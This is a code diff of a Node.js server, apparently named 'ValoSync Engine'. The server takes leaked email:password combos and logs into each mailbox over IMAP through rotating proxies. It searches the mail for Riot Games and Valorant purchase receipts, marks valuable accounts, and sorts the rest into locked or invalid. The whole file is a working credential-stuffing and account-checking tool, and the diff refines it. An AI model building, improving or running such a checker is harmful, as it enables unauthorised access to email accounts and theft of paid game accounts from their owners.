@@ -4,13 +4,18 @@ const { simpleParser } = require('mailparser');
 const { HttpsProxyAgent } = require('https-proxy-agent');
 const app = express();
 
-app.use(express.json({ limit: '50mb' }));
+app.use(express.json({ limit: '100mb' }));
 app.use(express.static('public'));
 
 async function checkMail(email, password, proxyStr) {
     let agent = null;
-    if (proxyStr) {
-        agent = new HttpsProxyAgent(proxyStr.startsWith('http') ? proxyStr : `http://${proxyStr}`);
+    if (proxyStr && proxyStr.trim().length > 5) {
+        try {
+            const cleanProxy = proxyStr.trim();
+            agent = new HttpsProxyAgent(cleanProxy);
+        } catch (e) {
+            console.log("Invalid Proxy Format:", proxyStr);
+        }
     }
 
     const client = new ImapFlow({
@@ -19,6 +24,7 @@ async function checkMail(email, password, proxyStr) {
         secure: true,
         auth: { user: email, pass: password },
         logger: false,
+        greetingTimeout: 20000,
         ...(agent && { tls: { agent } })
     });
 
@@ -32,8 +38,7 @@ async function checkMail(email, password, proxyStr) {
                 or: [
                     { header: { field: 'from', value: 'Riot Games' } },
                     { body: 'Valorant' },
-                    { body: 'Purchase Receipt' },
-                    { body: 'Order Confirmed' }
+                    { body: 'Purchase Receipt' }
                 ]
             });
 
@@ -42,7 +47,7 @@ async function checkMail(email, password, proxyStr) {
                 result.count = messages.length;
                 let lastMsg = await client.fetchOne(messages[messages.length - 1], { source: true });
                 let parsed = await simpleParser(lastMsg.source);
-                result.body = parsed.text || "No readable content found.";
+                result.body = parsed.text || "No content";
                 result.isSultan = /Purchase|Order|Receipt|Success|Payment/i.test(result.body);
             } else {
                 result.status = 'NO_DATA';
@@ -54,18 +59,16 @@ async function checkMail(email, password, proxyStr) {
         return result;
     } catch (err) {
         const msg = err.message.toLowerCase();
-        if (msg.includes('aup') || msg.includes('locked') || msg.includes('challenge')) return { status: 'LOCKED' };
+        if (msg.includes('aup') || msg.includes('locked')) return { status: 'LOCKED' };
         return { status: 'INVALID' };
     }
 }
 
 app.post('/api/check', async (req, res) => {
     const { combo, proxy } = req.body;
-    const [email, pass] = combo.split(':');
-    if (!email || !pass) return res.json({ status: 'ERROR' });
-    const data = await checkMail(email.trim(), pass.trim(), proxy);
+    const parts = combo.split(':');
+    const data = await checkMail(parts[0].trim(), parts[1].trim(), proxy);
     res.json({ ...data, combo });
 });
 
-const PORT = process.env.PORT || 7860;
-app.listen(PORT, () => console.log(`ValoSync Engine Active on Port ${PORT}`));
+app.listen(process.env.PORT || 7860);
